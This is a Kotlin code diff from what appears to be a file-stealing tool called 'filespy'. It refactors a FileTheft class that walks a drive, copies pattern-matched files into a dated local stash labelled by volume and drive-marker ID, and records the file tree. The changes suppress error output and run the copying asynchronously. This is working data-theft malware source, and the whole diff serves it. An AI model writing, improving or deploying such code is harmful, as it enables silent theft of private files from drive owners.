@@ -2,11 +2,13 @@ package studio.papercube.sh.filespy
 
 import studio.papercube.library.fileassist.DriveMarker
 import studio.papercube.library.fileassist.getVolumeLabel
+import studio.papercube.library.fileassist.label
 import studio.papercube.library.fileassist.validateFileName
+import studio.papercube.sh.filespy.concurrent.sharedExecutor
 import java.io.File
 import java.time.LocalDate
 import java.time.LocalTime
-import java.util.concurrent.CompletableFuture
+import java.util.concurrent.Future
 import java.util.stream.Collectors
 
 class FileTheft(val directory: File) : Theft {
@@ -25,7 +27,7 @@ class FileTheft(val directory: File) : Theft {
                 f.copyTo(targetFile, bufferSize = 16384)
                 targetFile.setLastModified(f.lastModified())
             } catch (e: Exception) {
-                e.printStackTrace()
+//                e.printStackTrace()
                 return false
             }
             return true
@@ -37,42 +39,68 @@ class FileTheft(val directory: File) : Theft {
     override fun steal() {
         log.i(LOG_TAG, "Stealing $directory on thread ${Thread.currentThread().name}")
         val patterns = PatternsManager.default.readPatterns()
-        val driveMarker = DriveMarker.resolve(directory)
+        val driveMarker = DriveMarker.inDrive(directory)
+        try {
+            driveMarker.resolve()
+        } catch (e: Exception) {
+            log.e(tag = "DriveMarker", msg = "Failed to mark drive", e = e)
+        }
         val destDir = File(
                 "${ConfigParameters.instance.dataPath}/" +
                         "${LocalDate.now()}" +
                         "/${LocalTime.now().toString().replace(':', '-').validateFileName()}" +
-                        "-${directory.absolutePath.first()}" +
+                        "-${directory.label}" +
                         "-${directory.getVolumeLabel().validateFileName()}" +
-                        "-id${driveMarker.markID()}"
+                        "-${driveMarker.markID()}"
         )
+        destDir.mkdirs()
         log.i(LOG_TAG, "Destination dir: $destDir")
         val fileWalker = FileWalker(directory)
+        val completeFileList = fileWalker.walk()
+        reportExceptionsIfNecessary(fileWalker.getExceptions())
 
-        if (!fileWalker.getExceptions().isEmpty()) {
-            val exceptions = fileWalker.getExceptions()
+        val stealResults: Map<Int, Long> = completeFileList
+                .stream()
+                .filter { fileToCheck -> patterns.any { pattern -> pattern.matchesWithName(fileToCheck.name) } }
+                .map { if (stealSingleFile(it, destDir)) STEAL_RESULT_SUCCESS else STEAL_RESULT_FAILURE }
+                .collect(Collectors.groupingBy({ value: Int -> value }, Collectors.counting()))
+
+
+        try {
+            File(destDir, "__FileTree__.txt").bufferedWriter().use { treeWriter->
+                treeWriter.write(fileWalker.fileTreeString)
+            }
+        } catch (e: Exception) {
+            log.e(msg = "Failed to write file tree.", e = e)
+        }
+
+        log.i(LOG_TAG, "Done stealing $directory. " +
+                "${stealResults[STEAL_RESULT_SUCCESS] ?: 0} file(s) succeeded, " +
+                "${stealResults[STEAL_RESULT_FAILURE] ?: 0} failed")
+    }
+
+    private fun reportExceptionsIfNecessary(exceptions: List<Throwable>) {
+        if (!exceptions.isEmpty()) {
             log.w(LOG_TAG, "${exceptions.size} exceptions encountered walking ${directory.absolutePath}")
             val headExceptions = exceptions
                     .take(30)
                     .joinToString(separator = "\n", prefix = "\n") { it.toString() }
             log.w(LOG_TAG, "The first 30 exceptions are : $headExceptions")
         }
-
-        val stealResults: Map<Int, Long> = fileWalker.walk()
-                .stream()
-                .filter { fileToCheck -> patterns.any { pattern -> pattern.matchesWithName(fileToCheck.name) } }
-                .map { if (stealSingleFile(it, destDir)) STEAL_RESULT_SUCCESS else STEAL_RESULT_FAILURE }
-                .collect(Collectors.groupingBy({ value: Int -> value }, Collectors.counting()))
-        val fileTreeOutput = File(destDir, "FileTree.txt").bufferedWriter()
-        fileTreeOutput.write(fileWalker.fileTreeString)
-        fileTreeOutput.close()
-        log.i(LOG_TAG, "Done stealing $directory. " +
-                "${stealResults[STEAL_RESULT_SUCCESS]} file(s) succeeded, " +
-                "${stealResults[STEAL_RESULT_FAILURE]} failed")
     }
 
-    fun stealAsync(): CompletableFuture<Unit> {
-        return CompletableFuture.supplyAsync { steal() }
+    fun stealAsync(): Future<*> {
+        return sharedExecutor.submit {
+            try {
+                steal()
+            } catch (e: Exception) {
+                log.e(
+                        tag = LOG_TAG,
+                        msg = "Unexpected exception raised when executing file theft asynchronously on ${Thread.currentThread().name}.",
+                        e = e
+                )
+            }
+        }
     }
 
 
